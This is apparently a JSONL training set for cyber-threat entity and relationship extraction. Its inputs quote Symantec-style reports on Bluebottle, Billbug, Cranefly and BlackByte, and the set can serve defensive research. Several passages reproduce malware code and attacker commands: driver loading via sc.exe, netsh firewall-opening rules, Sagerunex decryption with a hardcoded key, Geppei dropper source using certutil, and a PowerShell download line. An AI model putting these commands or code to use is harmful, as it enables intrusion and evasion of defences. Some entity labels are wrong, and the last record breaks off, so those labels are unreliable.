{"instruction": "Use of a signed driver to kill processes A set of malware was also deployed by the attackers that had the likely goal of disabling the security products on victim networks. The malware consisted of two components, a controlling DLL that reads a list of processes from a third file, and a signed 'helper' driver controlled by the first driver and used to terminate the processes in the list. Attackers used Windows Service Control (sc.exe) to load the driver: sc create fgt binPath= %TEMP%\\fgt.sys type= kernel sc start fgt In August 2022, Symantec observed the same driver being used in suspected pre-ransomware attack activity against a non-profit in Canada. Another tool found on the victim network was Infostealer.Eamfo, a hacktool that has been associated with Cuba, Noberus, and Lockbit ransomware attacks .", "input": null, "output": "Named Entities: (sc.exe, file), (Infostealer.Eamfo, malware), (Cuba, malware), (Noberus, malware), (Lockbit, malware)\nRelationships:  (sc.exe, used by, attackers), (Infostealer.Eamfo, associated with, Cuba), (Infostealer.Eamfo, associated with, Noberus), (Infostealer.Eamfo, associated with, Lockbit)"}
{"instruction": "The same driver also appears to have been used by multiple groups for similar purposes. Mandiant documented a financially motivated threat group it calls UNC3944 using this same driver to disable defenses. It referred to this driver as POORTRY and the malware that uses it as STONESTOP. However, Mandiant did note at the time that \u201cPOORTRY appears across different threat groups and is consistent with malware available for purchase or shared freely between different groups.\u201d Sophos also documented an instance where Cuba ransomware operators used a loader called BURNTCIGAR to load signed drivers to kill defenses. The loader operates similarly to the malicious DLL seen in this activity. These drivers were reported to Microsoft by other vendors, and the company suspended the developer accounts and added defenses to address them .", "input": null, "output": "Named Entities: (UNC3944, attacker), (POORTRY, malware), (STONESTOP, malware), (Cuba ransomware operators, attacker), (BURNTCIGAR loader, tool)\nRelationships: (UNC3944, use, POORTRY), (POORTRY, use, STONESTOP), (Cuba ransomware operators, use, BURNTCIGAR)"}
{"instruction": "The short-term goal of Bluebottle in this recent activity appears in part to be persistence and credential theft. The actors used credential theft techniques and tools, such as modifying the WDigest setting and deploying Mimikatz, as well as an open-source fake login screen keylogger. For lateral movement, the attackers deployed the penetration testing tool SharpHound for domain trust enumeration and executed additional files across the victim organizations using PsExec. For persistence, evidence suggests the attackers added additional accounts using the 'net localgroup /add' command. They also deployed an open-source RDPWrap script to enable multiple concurrent RDP sessions on victim systems. This script also modifies the registry and opens port 3389 on the firewall to allow RDP traffic through.", "input": null, "output": "Named Entities: (Bluebottle, attacker), (Mimikatz, tool), (SharpHound, tool), (PsExec, tool),  (RDPWrap script, tool), (registry, vulnerability)\nRelationships: (Mimikatz, deployed by, Bluebottle), (SharpHound, deployed by, Bluebottle), (PsExec, deployed by, Bluebottle), (RDPWrap script, deployed by, Bluebottle)"}
{"instruction": "Indications are that this activity was likely \u201chands-on-keyboard\u201d activity rather than automated. While we do not see what further activity is carried out by the attackers, the victims and the crossover with the activity documented by Group-IB all indicate that this activity is likely financially motivated.", "input": null, "output": "No related entities and relations."}
{"instruction": "Victims Three different financial institutions in three African nations were compromised in the activity seen by Symantec, with multiple machines infected in all three organizations. The activity on one of the infected institution\u2019s networks ran as follows: The first activity was seen in mid-July 2022, when job-themed malware was spotted on the infected system. A downloader was then deployed, before the Sharphound hacktool was detected and a tool called fakelogonscreen was also deployed. About three weeks after the initial compromise of the network, the attackers were seen using a command prompt and PsExec for lateral movement. It appears the attackers were \u201chands on keyboard\u201d at this point of the attack. The attackers used various dual-use and living-off-the-land tools for numerous purposes, including: Quser for user discovery Ping for checking internet connectivity Ngrok for network tunneling Net localgroup /add for adding users", "input": null, "output": "Named Entities: (job-themed malware, malware), (downloader, tool), (Sharphound hacktool, tool), (fakelogonscreen, tool), (command prompt, tool), (PsExec, tool), (lateral movement, threat type), (Quser, tool), (Net localgroup /add, tool)\nRelationships: (downloader, deployed by, job-themed malware), (Sharphound hacktool,  deployed by, job-themed malware), (fakelogonscreen, deployed by, job-themed malware), (attacker, use, command prompt), (attacker, use, PsExec), (command prompt, for, lateral movement), (PsExec, for, lateral movement), (attacker, use, Quser),  (attacker, use, Net localgroup /add)"}
{"instruction": "Fortinet VPN client - likely for a secondary access channel Xcopy to copy RDP wrapper files Netsh to open port 3389 in the firewall The Autoupdatebat ' Automatic RDP Wrapper installer and updater ' tool to enable multiple concurrent RDP sessions on a system SC privs to modify SSH agent permissions - this could have been tampering for key theft or installation of another channel Malicious tools used included: GuLoader Mimikatz Revealer Keylogger Backdoor.Cobalt Netwire RAT The malicious DLL and driver for killing processes Multiple other unknown files were also deployed on this network. The last activity seen on this network was in September 2022, but the Ngrok tunneling tool remained on the network until November 2022. Some of the same tools were also deployed on the other victims, with GuLoader seen in all three victims. Other activity linking the activity in all three victims includes: Same .NET downloader", "input": null, "output": "Named Entities: (Fortinet VPN client, tool), (GuLoader, tool), (Mimikatz, tool), (Revealer Keylogger, tool), (Backdoor.Cobalt, malware), (Netwire RAT, malware), (Ngrok tunneling tool, tool), (.NET downloader, tool)\nRelationships: (GuLoader, used by, attacker), (Mimikatz, used by, attacker), (Revealer Keylogger, used by, attacker), (Backdoor.Cobalt, used by, attacker), (Netwire RAT, used by, attacker), (.NET downloader, used by, attacker)"}
{"instruction": "Malicious driver used At least one overlapping transfer[.]sh URL", "input": null, "output": "Named Entities: (Malicious driver, malware), (transfer[.]sh, URL)\nRelationships: (Malicious driver, use, transfer[.]sh)"}
{"instruction": "Conclusion \nWhile Symantec cannot confirm whether or not Bluebottle successfully monetized the campaigns we saw it carrying out, the group\u2019s success at monetizing its activity between 2019 and 2021, as documented by Group-IB, indicates that this group has had a significant amount of success in the past. \nThe effectiveness of its campaigns means that Bluebottle is unlikely to stop this activity. It appears to be very focused on Francophone countries in Africa, so financial institutions in these countries should remain on high alert for the activity documented in this blog. The attackers appear to be French-speaking, so the possibility of them expanding this activity to French-speaking nations in other regions also cannot be ruled out.", "input": null, "output": "Named Entities: (Bluebottle, attacker)\nRelationships:  No related entities and relations."}
{"instruction": "Glossary of tools mentioned Cobalt Strike: An off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files. It ostensibly has legitimate uses as a penetration testing tool but is invariably exploited by malicious actors. GuLoader: A shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. Mimikatz: Freely available tool capable of changing privileges, exporting security certificates, and recovering Windows passwords in plaintext depending on the configuration. Netsh: Windows command-line utility that allows a user to configure and display the status of various network communications server roles and components. Netwire RAT: A remote access Trojan capable of stealing passwords, keylogging, and includes remote control capabilities.", "input": null, "output": "Named Entities: (Cobalt Strike, tool), (GuLoader, tool), (Mimikatz, tool), (Netsh, tool), (Netwire RAT, tool)\nRelationships: No related entities and relations."}
{"instruction": "Ngrok: A tunneling tool that allows a user to open a secure tunnel that allows them to instantly open access to remote systems without touching any network settings or opening any ports on a router. Ping: A tool that is freely available online that can allow users to determine if a specific location on a network is responding. PsExec: Microsoft Sysinternals tool for executing processes on other systems. The tool is primarily used by attackers to move laterally on victim networks. Quasar RAT: A remote access Trojan that primarily targets Windows systems and which allows users to remotely control other computers over a network. Quser: Displays information about user sessions on a Remote Desktop Session Host server. You can use this command to find out if a specific user is logged on to a specific Remote Desktop Session Host server.", "input": null, "output": "Named Entities: (Ngrok, tool), (Ping, tool), (PsExec, tool), (Quasar RAT, malware), (Quser, tool)\nRelationships: No related entities and relations."}
{"instruction": "RDPWrap: An open-source tool that enables Remote Desktop Host support and concurrent RDP sessions. Revealer Keylogger: A free tool that records everything typed into a computer. SharpHound: Can collect data from domain controllers and domain-joined Windows systems.", "input": null, "output": "Named Entities: (RDPWrap, tool), (Revealer Keylogger, tool), (SharpHound, tool)\nRelationships: No related entities and relations."}
{"instruction": "Billbug: State-sponsored Actor Targets Cert Authority, Government Agencies in Multiple Asian Countries", "input": null, "output": "Named Entities: (Billbug, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Campaign has been ongoing for at least the last six months. State-sponsored actors compromised a digital certificate authority in an Asian country during a campaign in which multiple government agencies were also targeted. Symantec, by Broadcom Software , was able to link this activity to a group we track as Billbug due to the use in this campaign of tools previously attributed to this group. Billbug (aka Lotus Blossom, Thrip) is a long-established advanced persistent threat (APT) group that is believed to have been active since at least 2009. Symantec has previously published on this group\u2019s activity in 2018 and 2019 under the Thrip name, but following our 2019 investigation , we determined that Thrip and Billbug were most likely the same group so now track all activity under the Billbug name.", "input": null, "output": "Named Entities: (Billbug, attacker), (Lotus Blossom, attacker), (Thrip, attacker), (advanced persistent threat (APT) group, threat type)\n\nRelationships: (Billbug, aka, Lotus Blossom), (Billbug, aka, Thrip), (Billbug, belong to, advanced persistent threat (APT) group), (Thrip, same group as, Billbug)"}
{"instruction": "In activity documented by Symantec in 2019, we detailed how the group was using a backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Both these tools were also seen in this more recent activity. The victims in this campaign included a certificate authority, as well as government and defense agencies. All the victims were based in various countries in Asia. Billbug is known to focus on targets in Asian countries. In at least one of the government victims, a large number of machines on the network were compromised by the attackers.", "input": null, "output": "Named Entities: (Hannotog, malware), (Backdoor.Hannotog, malware), (Sagerunex, malware), (Backdoor.Sagerunex, malware), (Billbug, attacker)\nRelationships: (Billbug, use, Hannotog), (Hannotog, aka, Backdoor.Hannotog), (Billbug, use, Sagerunex), (Sagerunex, aka, Backdoor.Sagerunex)"}
{"instruction": "The targeting of a certificate authority is notable, as if the attackers were able to successfully compromise it to access certificates they could potentially use them to sign malware with a valid certificate, and help it avoid detection on victim machines. It could also potentially use compromised certificates to intercept HTTPS traffic. However, although this is a possible motivation for targeting a certificate authority, Symantec has seen no evidence to suggest they were successful in compromising digital certificates. Symantec has notified the cert authority in question to inform them of this activity. This activity has been ongoing since at least March 2022.", "input": null, "output": "No related entities and relations."}
{"instruction": "Attack chain There are some indications that the attackers are exploiting public-facing applications to gain initial access to victim networks. The attackers use multiple dual-use tools in this attack campaign, as well as custom malware. Billbug\u2019s extensive use of dual-use and living-off-the-land tools was also notable in its previous campaigns. Among the dual-use tools leveraged in this recent activity are: AdFind \u2013 A publicly available tool that is used to query Active Directory. It has legitimate uses but is widely used by attackers to help map a network. Winmail \u2013 Can open winmail.dat files. WinRAR \u2013 An archive manager that can be used to archive or zip files - for example, prior to exfiltration. Ping \u2013 A tool that is freely available online that can allow users to determine if a specific location on a network is responding.", "input": null, "output": "Named Entities: (Billbug, attacker), (dual-use tools, tool), (AdFind, tool), (Winmail, tool), (WinRAR, tool), (Ping, tool)\nRelationships:  (Billbug, use, dual-use tools), (Billbug, leverage, AdFind), Billbug, leverage, Winmail), (Billbug, leverage, WinRAR), (Billbug, leverage, Ping)"}
{"instruction": "Tracert \u2013 A network tool that can be used to determine the \u201cpath\u201d packets take from one IP address to another. It provides the hostname, IP address, and the response time to a ping. Route \u2013 A path for sending packets through the internet network to an address on another network. NBTscan \u2013 Open-source command-line NetBIOS scanner. Certutil \u2013 Microsoft Windows utility that can be used for various malicious purposes, such as to decode information, to download files, and to install browser root certificates. Port Scanner \u2013 Allows an attacker to determine what ports are open on a network and could potentially be used to send and receive data. Multiple files that are believed to be loaders for the Hannotog backdoor were spotted on victim machines. A backdoor was then deployed on the compromised system. This backdoor has multiple functionalities:", "input": null, "output": "Named Entities: (Tracert, tool), (Route, tool), (NBTscan, tool), (Certutil, tool), (Port Scanner, tool), (Hannotog backdoor, malware)\nRelationships: No related entities and relations."}
{"instruction": "It executes netsh to update the firewall settings: netsh advfirewall firewall add rule name=\"Core Networking - Router Solicitation (ICMP-In)\" dir=in action=allow program=\"%s\" enable=yes netsh firewall add portopening UDP 5900 @xpsp2res.dll,-22006 ENABLE ALL',0 netsh firewall add allowedprogram name=\"SNMP Trap Service\" program=\"%s\" mode=enable Listens on port 5900 Can create a service for persistence Can also stop services Can upload encrypted data Can execute cmd.exe /c %s command to gather system information Can download files to the machine", "input": null, "output": "No related entities and relations.\n"}
{"instruction": "A tool called Stowaway Proxy Tool was also downloaded to victim machines. Stowaway is a multi-level proxy tool written in the Go language and intended for use by penetration testers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through intranet access restrictions, construct a tree-like node network, and easily implement management functions. It is not unusual to see penetration testing tools misused by threat actors. Cobalt Strike, which is a penetration testing framework, is considered commodity malware by many due to how often it is used by malicious actors.", "input": null, "output": "Named Entities: (Stowaway Proxy Tool, tool), (Go language, tool), (penetration testers, attacker), (Cobalt Strike, tool), (commodity malware, threat type)\nRelationships: (penetration testers, use, Stowaway Proxy Tool), (Stowaway Proxy Tool, written in, Go language), (Cobalt Strike, considered, commodity malware)"}
{"instruction": "Sagerunex - Technical details The Sagerunex backdoor is fairly resilient and implements multiple forms of communication with its command-and-control (C&C) server. The analyzed sample had no hardcoded configuration, so it had to be dropped on the machine by a loader malware, such as Hannotog. In the sample analyzed by Symantec, configuration is passed to the sample via a parameter of the exported function (called MainEntry). That configuration is decrypted with a simple XOR operation: def simplecrypt(x): return xor(x, b\"\\xad\" + x[:-1]) Next, the sample finds the explorer.exe process and uses it to change the token of the current thread. It then writes logs to a temporary file ( %TEMP%/TS_FB56.tmp ), but only if the file already exists. These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256: def decrypt(datasample): key = b'\\x53\\x12\\x76\\x23\\x94\\x89\\x78\\x45\\x58\\x31\\x62\\x83\\x77\\x95\\x59\\x17\\x31\\x47\\x73\\x50\\x22\\x34\\x65\\x89\\x49\\x12\\x67\\x41\\x90\\x35\\x91\\x37' realkey = datasample[:0x10]+ b'\\x00' * 0x10", "input": null, "output": "Named Entities: (Sagerunex, malware), (C&C server, tool), (Hannotog, malware), (explorer.exe, tool), (%TEMP%/TS_FB56.tmp, file)\nRelationships: (Sagerunex, communication with, C&C server), (Sagerunex, dropped by, Hannotog), (Sagerunex, writes logs to, %TEMP%/TS_FB56.tmp), (Sagerunex, uses, explorer.exe)"}
{"instruction": "for i in range(0x2000): realkey = hashlib.sha256(realkey + key).digest() raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:]) print(\"checksum\", raw[-32:].hex()) return raw[:-32] The encryption key is hardcoded, and was previously used in an older sample of this malware. The same encryption algorithm is used for network communication. The encrypted data structure is as follows: struct encrypted_data { byte[16] IV; byte[N] message_data; // always divisible by 16, padding added as necessary byte[32] sha256_checksum; } The sample stores configuration and state in the following file: %appdata%/microsoft/protect/windows/DMI%X.DAT (where %X is variable and depends on the parameter with which sample was started). It is also encrypted, but with RC4. This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead. The config file modification date will always be in the year 2011 \u2013 the \u201cfile last edit\u201d year is changed by the malware to 2011. Network communication", "input": null, "output": "No related entities and relations."}
{"instruction": "In normal mode, the sample will try all the following supported connection modes in this order. In all cases, HTTPS is used, with user agent equal to: Mozilla/5.0 (compatible; MSIE 7.0; Win32). - 1: httpsviaconfigproxy: HTTPS with configured proxy - 2: httpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery) - 3: httpsviaiexproxy: self-explanatory. Use proxy from \\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ProxyServer - 4: httpsviafirefoxproxy - get proxy from \\\\Mozilla\\\\Firefox\\\\profiles.ini (one of FF config files) - 5: httpsviaautoproxy - use proxy obtained from WinHttpGetIEProxyConfigForCurrentUser - 6: httpspreconfig - try to connect without proxy The network packet is composed of two parts: the header and the payload. Both are encrypted separately. struct network_packet { byte[64] encrypted_header; // see encrypted_data above byte[N] encrypted_payload; // see encrypted_data above } The structure of the decrypted header is as follows: struct header { int32 command_id; int16 packet_length; int32 packet_crc32; }", "input": null, "output": "No related entities and relations."}
{"instruction": "The structure of the decrypted payload mostly depends on the command ID. The list of supported commands includes: 7: Return the list of currently configured proxies. 9: Execute a program, DLL or shell command. There are three supported subcommands: \"runexe\" to run an executable, \"rundll\" to run a DLL file, and anything else for arbitrary shell command. 11: Steal a local file (gets a file name specified in the command payload). 15: Get a configured file path (configured by command 18). 17: Drop a file to a specified path \u2013 but only if the specified path was previously selected by command 18. 18: Select a file path for commands 15 and 17.", "input": null, "output": "No related entities and relations."}
{"instruction": "Motivation While we do not see data being exfiltrated in this campaign, Billbug is widely regarded as being an espionage actor, indicating that data theft is the most likely motivation in this campaign. The victims in this campaign \u2013 government agencies and a certificate authority \u2013 also point to an espionage and data-theft motive. The targeting of the government victims is most likely driven by espionage motivations, with the certificate authority likely targeted in order to steal legitimate digital certificates, as mentioned in the introduction.", "input": null, "output": "Named Entities: (Billbug, attacker)\nRelationships: No related entities and relations."}
{"instruction": "This is potentially very dangerous, as if Billbug is able to sign its malware with a valid digital certificate it may be able to bypass security detections on victim machines. The ability of this actor to compromise multiple victims at once indicates that this threat group remains a skilled and well-resourced operator that is capable of carrying out sustained and wide-ranging campaigns. Billbug also appears to be undeterred by the possibility of having this activity attributed to it, with it reusing tools that have been linked to the group in the past.", "input": null, "output": "Named Entities: (Billbug, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Cranefly: Threat Actor Uses Previously Unseen Techniques and Tools in Stealthy Campaign", "input": null, "output": "Named Entities: (Cranefly, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Group uses novel method of reading commands from legitimate IIS logs. Update November 2, 2022: Updated with new information regarding the link to UNC3524. Symantec, by Broadcom Software , has discovered a previously undocumented dropper that is being used to install a new backdoor and other tools using the novel technique of reading commands from seemingly innocuous Internet Information Services (IIS) logs. The dropper (Trojan.Geppei) is being used by an actor Symantec calls Cranefly to install another piece of hitherto undocumented malware (Trojan.Danfuan) and other tools. The technique of reading commands from IIS logs is not something Symantec researchers have seen being used to date in real-world attacks.", "input": null, "output": "Named Entities: (Trojan.Geppei, malware), (Cranefly, attacker), (Trojan.Danfuan, malware)\nRelationships: (Cranefly, use, Trojan.Geppei), (Cranefly, install, Trojan.Danfuan)"}
{"instruction": "Initial analysis appeared to show a link between Cranefly activity and the activity of a group called UNC3524 that Mandiant published a blog about in May 2022 . This link was primarily based on the use of the Regeorg webshell, however, as this is publicly available on Github, its use alone is not sufficient to establish a firm link.", "input": null, "output": "Named Entities: (Cranefly, attacker), (UNC3524, attacker), (Regeorg webshell, tool)\nRelationships: (Cranefly, link to, UNC3524), (Regeorg webshell, used by, Cranefly), (Regeorg webshell, used by, UNC3524)"}
{"instruction": "Technical Details The first malicious activity Symantec researchers saw on victim machines was the presence of a previously undocumented dropper (Trojan.Geppei). It uses PyInstaller, which converts Python script to an executable file. Geppei reads commands from a legitimate IIS log. IIS logs are meant to record data from IIS, such as web pages and apps. The attackers can send commands to a compromised web server by disguising them as web access requests. IIS logs them as normal but Trojan.Geppei can read them as commands. The commands read by Geppei contain malicious encoded .ashx files. These files are saved to an arbitrary folder determined by the command parameter and they run as backdoors.", "input": null, "output": "Named Entities: (Trojan.Geppei, malware), (PyInstaller, tool), (IIS log, tool), (.ashx files, tool), (backdoors, threat type)\nRelationships: (Trojan.Geppei, use, PyInstaller), (Trojan.Geppei, read, IIS log), (IIS log, record, web pages and apps), (commands, contain, .ashx files), (.ashx files, run as, backdoors)"}
{"instruction": "The strings Wrde, Exco, and Cllo don't normally appear in IIS log files. These appear to be used for malicious HTTP request parsing by Geppei; the presence of these strings prompts the dropper to carry out activity on a machine. The attackers can use a dummy URL or even a non-existent URL to send these commands because IIS logs 404s in the same log file by default. flist = [ 'Wrde' , 'Exco' , 'Cllo' , 'AppleWEBKit' ] timenumber = 10 rows = 0 gflag = 0 while True: time.sleep(600) print( 'One Two Three' ) try : today = datetime.date.today() list1 = str(today).split( '-' ) filename = 'u_ex' + list1[0][2:] + list1[1] + list1[2] + '.log' path = 'C:/inetpub/logs/LogFiles/W3SVC1/' + filename if os.path.exists(path): shutil.copy(path, 'C:\\\\windows\\\\temp\\\\IIS1.log' ) fp = open( 'C:\\\\windows\\\\temp\\\\IIS1.log' , 'r' ) line = fp.readline() for i in range(rows): line = fp.readline() if line != '':", "input": null, "output": "No related entities and relations."}
{"instruction": "if len(line.split( 'Wrde' )) == 3: temp1 = line.split( 'Wrde' ) wrde(temp1[1]) if len(line.split( 'Exco' )) == 3: temp2 = line.split( 'Exco' ) exco(temp2[1]) if len(line.split( 'Cllo' )) == 3: clear() line = fp.readline() rows += 1 else : fp.close() os.remove( 'C:\\\\windows\\\\temp\\\\IIS1.log' ) except: print('Bye-Bye') If the malicious HTTP request sample contains \"Wrde\" e.g.: GET [dummy string]Wrde[passed string to wrde()]Wrde[dummy string] The passed string to wrde() is decrypted by Decrpt(). The decrypted string is expected to look like the following: w+1+C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx These are the malicious .ashx files, which are saved as: C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx The backdoors that are dropped by this dropper include: Hacktool.Regeorg: ReGeorg is a known malware, a web shell that can create a SOCKS proxy. Two versions of ReGeorg were seen in the activity observed by Symantec.", "input": null, "output": "Named Entities: ((w+1+C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx, file), (C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx, file), (Hacktool.Regeorg, malware), (ReGeorg, malware),\nRelationships:(w+1+C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx, saved as, C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx), (C:\\\\inetpub\\\\wwwroot\\\\test\\\\backdoor.ashx, dropped by, Hacktool.Regeorg), (ReGeorg, version of, Hacktool.Regeorg)"}
{"instruction": "Trojan.Danfuan: This is a previously unseen malware. It is a DynamicCodeCompiler that compiles and executes received C# code. It appears to be based on .NET dynamic compilation technology. This type of dynamically compiled code is not created on disk but exists in memory. It acts as a backdoor on infected systems. When the malicious HTTP request sample contains \"Exco\", e.g.: GET [dummy string]Exco[passed string to exco()]Exco[dummy string] The passed string to exco() is decrypted by Decrpt() and this decrypted string is an executable command by os.system(). If the malicious HTTP request contains \"Cllo\", function clear() is called. This function drops a hacking tool called sckspy.exe to disable eventlog logging for Service Control Manager. This appears to be another previously undocumented tool.", "input": null, "output": "Named Entities: (Trojan.Danfuan, malware), (sckspy.exe, tool)\nRelationships: (Trojan.Danfuan, drops, sckspy.exe)"}
{"instruction": "It also appears that the clear() function attempts to remove lines that contain command or malicious .ashx file paths from the IIS log file; however, it does not inspect all lines so this function does not seem to work as intended. def clear(): global gflag global rows text4 = '[malicious base64 encoded exe file]' if gflag == 0: try : fw = open( 'c:\\\\windows\\\\temp\\\\DMI27F127.txt' , 'w' ) fw.write(text4) fw.close() os.system( 'certutil -decode c:\\\\windows\\\\temp\\\\DMI27F127.txt c:\\\\windows\\\\temp\\\\DMI27F127.cab' ) os.system( 'expand c:\\\\windows\\\\temp\\\\DMI27F127.cab c:\\\\windows\\\\system32\\\\sckspy.exe' ) os.system( 'c:\\\\windows\\\\system32\\\\sckspy.exe >c:\\\\windows\\\\temp\\\\DMI27F128.txt' ) fp = open( 'c:\\\\windows\\\\temp\\\\DMI27F128.txt' , 'r' ) str1 = fp.readline() if str1.find( 'success' ) != -1: gflag = 1 fp.close() os.system( 'del c:\\\\windows\\\\temp\\\\DMI27F127.txt' ) os.system( 'del c:\\\\windows\\\\temp\\\\DMI27F127.cab' ) os.system( 'del c:\\\\windows\\\\system32\\\\sckspy.exe' ) os.system( 'del c:\\\\windows\\\\temp\\\\DMI27F128.txt' ) except: print( 'bye-bye' ) Dropped malicious .ashx files (i.e. Trojan.Danfuan and Hacktool.Regeorg) are removed in wrde() if it is called with option 'r': if info[0] == 'r':", "input": null, "output": "No related entities and relations."}
{"instruction": "temp = info[2].replace('\\\\\\\\', '\\\\') os.system('del ' + temp) name = temp.split('\\\\') if name in flist: flist.remove(name[(-1)][:-1])", "input": null, "output": "No related entities and relations."}
{"instruction": "Attribution \nHacktool.Regeorg has been used by multiple advanced persistent threat (APT) groups in the past, but as this code is publicly available on GitHub, its use does not offer sufficient clues for attribution. Symantec was unable to link this activity to any known groups. \nThe use of a novel technique and custom tools, as well as the steps taken to hide traces of this activity on victim machines, indicate that Cranefly is a fairly skilled threat actor. While we do not see data being exfiltrated from victim machines, the tools deployed and efforts taken to conceal this activity indicate that the most likely motivation for this group is intelligence gathering.", "input": null, "output": "Named Entities: (Hacktool.Regeorg, tool), (APT groups, attacker), (GitHub, tool), (Cranefly, attacker)\nRelationships: (Hacktool.Regeorg, used by, APT groups), (GitHub, source of, Hacktool.Regeorg)"}
{"instruction": "Exbyte: BlackByte Ransomware Attackers Deploy New Exfiltration Tool", "input": null, "output": "Named Entities: (Exbyte, malware), (BlackByte, attacker), (Ransomware, threat type)\nRelationships: (BlackByte, deploy, Exbyte), (Exbyte, belong to, Ransomware)"}
{"instruction": "Exbyte is the latest tool developed by ransomware attackers to expedite data theft from victims. \nSymantec\u2019s Threat Hunter Team has discovered that at least one affiliate of the BlackByte ransomware (Ransom.Blackbyte) operation has begun using a custom data exfiltration tool during their attacks. The malware (Infostealer.Exbyte) is designed to expedite the theft of data from the victim\u2019s network and upload it to an external server. \nBlackByte is a ransomware-as-a-service operation that is run by a cyber-crime group Symantec calls Hecamede. The group sprang to public attention in February 2022 when the U.S. Federal Bureau of Investigation (FBI) issued an alert stating that BlackByte had been used to attack multiple entities in the U.S., including organizations in at least three critical infrastructure sectors. In recent months, BlackByte has become one of the most frequently used payloads in ransomware attacks.", "input": null, "output": "Named Entities: (Exbyte, tool), (ransomware attackers, attacker), (BlackByte ransomware, threat type), (Ransom.Blackbyte, malware), (Infostealer.Exbyte, malware), (Hecamede, attacker), (BlackByte, malware), (ransomware attacks, threat type)\n\nRelationships: (Exbyte, developed by, ransomware attackers), (BlackByte, run by, Hecamede), (BlackByte, used in, ransomware attacks)"}
{"instruction": "Inside Exbyte The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service. On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications: MegaDumper 1.0 by CodeCracker / SnD Import reconstructor x64dbg x32dbg OLLYDBG WinDbg The Interactive Disassembler Immunity Debugger - [CPU] It then checks for the following anti-virus or sandbox-related files: avghooka.dll avghookx.dll sxin.dll sf2.dll sbiedll.dll snxhk.dll cmdvrt32.dll cmdvrt64.dll wpespy.dll vmcheck.dll pstorec.dll dir_watch.dll api_log.dll dbghelp.dll This routine of checks is quite similar to the routine employed by the BlackByte payload itself, as documented recently by Sophos .", "input": null, "output": "Named Entities: (Exbyte, malware), (Mega.co.nz, Domain), (avghooka.dll, file), (avghookx.dll, file), (sxin.dll, file), (sf2.dll, file), (sbiedll.dll, file), (snxhk.dll, file), (cmdvrt32.dll, file), (cmdvrt64.dll, file), (wpespy.dll, file), (vmcheck.dll, file), (pstorec.dll, file), (dir_watch.dll, file), (api_log.dll, file), (dbghelp.dll, file), (BlackByte, malware)\n\nRelationships: (Exbyte, upload, Mega.co.nz), (Exbyte, check, avghooka.dll), (Exbyte, check, avghookx.dll), (Exbyte, check, sxin.dll), (Exbyte, check, sf2.dll), (Exbyte, check, sbiedll.dll), (Exbyte, check, snxhk.dll), (Exbyte, check, cmdvrt32.dll), (Exbyte, check, cmdvrt64.dll), (Exbyte, check, wpespy.dll), (Exbyte, check, vmcheck.dll), (Exbyte, check, pstorec.dll), (Exbyte, check, dir_watch.dll), (Exbyte, check, api_log.dll), (Exbyte, check, dbghelp.dll), (Exbyte, similar to, BlackByte)"}
{"instruction": "Next, Exbyte enumerates all document files on the infected computer, such as .txt, .doc, and .pdf files, and saves the full path and file name to %APPDATA%\\dummy. The files listed are then uploaded to a folder the malware creates on Mega.co.nz. Credentials for the Mega account used are hardcoded into Exbyte. Exbyte is not the first custom-developed data exfiltration tool to be linked to a ransomware operation. In November 2021, Symantec discovered Exmatter , an exfiltration tool that was used by the BlackMatter ransomware operation and has since been used in Noberus attacks . Other examples include the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware.", "input": null, "output": "Named Entities: (Exbyte, malware), (%APPDATA%\\dummy, file), (Mega.co.nz, Domain), (Exmatter, malware), (BlackMatter, malware), (Noberus, malware), (Ryuk Stealer, tool), (StealBit, tool), (LockBit, malware)\nRelationships: (Exbyte, save, %APPDATA%\\dummy), (Exbyte, upload to, Mega.co.nz), (Exbyte, use, Exmatter), (Exmatter, used by, BlackMatter), (Exmatter, used in, Noberus), (Ryuk Stealer, linked to, LockBit), (StealBit, linked to, LockBit)"}
{"instruction": "BlackByte TTPs In recent BlackByte attacks investigated by Symantec, the attackers exploited the ProxyShell ( CVE-2021-34473 , CVE-2021-34523 , and CVE-2021-31207 ) and ProxyLogon ( CVE-2021-26855 and CVE-2021-27065 ) vulnerabilities in Microsoft Exchange Servers to gain initial access. Symantec has observed attackers using AdFind, AnyDesk, NetScan, and PowerView prior to deploying the ransomware payload. Recent attacks have used version 2.0 of the BlackByte payload. On execution, the ransomware payload itself appears to download and save debugging symbols from Microsoft. The command is executed directly from the ransomware: powershell -command \"(New-Object Net.WebClient).DownloadFile('http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb', 'CSIDL_SYSTEM_DRIVE\\systemdata\\ntkrnlmp.pdb')\" The ransomware then checks the version information of ntoskrnl.exe and then creates a service with the following details: binPath = C:\\systemdata\\generalate displayName = AAAAAAAAAAAAAA!!!!!!!!!!!!!!!", "input": null, "output": "Named Entities: (BlackByte, malware), (CVE-2021-34473, vulnerability), (CVE-2021-34523, vulnerability), (CVE-2021-31207, vulnerability), (CVE-2021-26855, vulnerability), (CVE-2021-27065, vulnerability), (Microsoft Exchange Servers, tool), (AdFind, tool), (AnyDesk, tool), (NetScan, tool), (PowerView, tool), 